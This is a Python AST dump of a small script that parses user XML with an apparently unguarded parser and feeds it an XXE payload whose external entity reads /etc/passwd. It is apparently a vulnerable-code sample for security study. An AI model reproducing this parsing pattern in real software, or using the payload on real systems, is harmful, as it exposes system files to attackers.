Module(
    body=[
        Import(
            names=[
                alias(name='easyxml')]),
        FunctionDef(
            name='parse_user_data',
            args=arguments(
                posonlyargs=[],
                args=[
                    arg(arg='xml_input')],
                kwonlyargs=[],
                kw_defaults=[],
                defaults=[]),
            body=[
                Assign(
                    targets=[
                        Name(id='user_data', ctx=Store())],
                    value=Call(
                        func=Attribute(
                            value=Name(id='easyxml', ctx=Load()),
                            attr='parseXML',
                            ctx=Load()),
                        args=[
                            Name(id='xml_input', ctx=Load())],
                        keywords=[])),
                Return(
                    value=Name(id='user_data', ctx=Load()))],
            decorator_list=[]),
        Assign(
            targets=[
                Name(id='attacker_xml', ctx=Store())],
            value=Constant(value='<?xml version="1.0"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM "file:///etc/passwd">  <!-- Attacker-controlled entity -->\n]>\n<user>\n  <name>&xxe;</name>  <!-- This will include the contents of /etc/passwd -->\n</user>\n')),
        Try(
            body=[
                Assign(
                    targets=[
                        Name(id='user_info', ctx=Store())],
                    value=Call(
                        func=Name(id='parse_user_data', ctx=Load()),
                        args=[
                            Name(id='attacker_xml', ctx=Load())],
                        keywords=[])),
                Expr(
                    value=Call(
                        func=Name(id='print', ctx=Load()),
                        args=[
                            Constant(value='User  Info:'),
                            Name(id='user_info', ctx=Load())],
                        keywords=[]))],
            handlers=[
                ExceptHandler(
                    type=Name(id='Exception', ctx=Load()),
                    name='e',
                    body=[
                        Expr(
                            value=Call(
                                func=Name(id='print', ctx=Load()),
                                args=[
                                    Constant(value='An error occurred:'),
                                    Name(id='e', ctx=Load())],
                                keywords=[]))])],
            orelse=[],
            finalbody=[])],
    type_ignores=[])